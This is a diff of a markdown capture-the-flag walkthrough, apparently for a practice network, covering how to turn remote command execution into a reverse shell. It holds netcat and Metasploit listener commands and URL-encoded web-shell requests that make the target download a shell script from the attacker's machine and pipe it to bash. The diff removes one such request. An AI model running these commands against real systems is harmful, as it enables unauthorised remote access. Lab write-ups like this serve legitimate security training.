@@ -41,6 +41,7 @@ The above command is entirely ready to go. You will only need to change the IP a
 You can now start a listener using Netcat or Metasploit to catch your reverse shell once executed. Find commands below to start listeners.  
 
 - `nc -lvnp 53`
+or
 - `use exploit/multi/handler`
 
 Now that you have the full payload and execution command ready, you can use it and the RCE to gain a shell onto the box. Find the full command below.  
@@ -58,9 +59,6 @@ Command used: `curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%
 
 - Start up a local web server in the `shellscript.sh` directory on your attacking machine.
 	`python3 -m http.server 80`
-
-- On your browser visit the following URL:
-	http://admin.holo.live/dashboard.php?cmd=curl%20http%3A%2F%2F10.50.74.165%3A80%2Fshellscript.sh%7Cbash%20%26
 
 - On your attacking machine, start a listener using Netcat .
 	`nc -lvnp 53`
